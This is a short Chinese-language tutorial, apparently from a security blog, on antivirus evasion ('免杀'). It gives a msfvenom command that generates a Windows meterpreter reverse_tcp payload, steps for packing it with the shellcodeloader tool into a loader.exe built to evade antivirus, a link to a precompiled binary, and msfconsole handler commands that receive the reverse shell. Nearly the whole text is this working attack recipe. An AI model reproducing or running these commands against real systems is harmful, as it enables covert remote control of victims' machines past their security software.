所谓计算机🦠，是指人为开发的一些恶意程序。具有一定的破坏性，复制，传播等特性。因计算机病毒的出现，才出现了杀毒软件。故而病毒永远走在杀毒前面。而如何免杀是测试人员永远不停歇的话题，攻和防已成为现在网络安全的趋势。简单来看看利用shellcodeloader的免杀吧！

首先利用msf生成shell

在kali生成bbskali.binShell

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.33 lport=5555 -f raw -o bbskali.bin

将生成的bbskali.bin复制到本地，访问项目地址：https://github.com/knownsec/shellcodeloader
使用VS2015打开项目的解决方案.sln，再进行编译即可。
当然你也可以用我编译好的！

（点击阅读原文 下载附件）

将生成的bbskali.bin拖动到shellcodeLoader中

​

点击Generate会生成loader.exe

配置msf

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.123.33
exploit
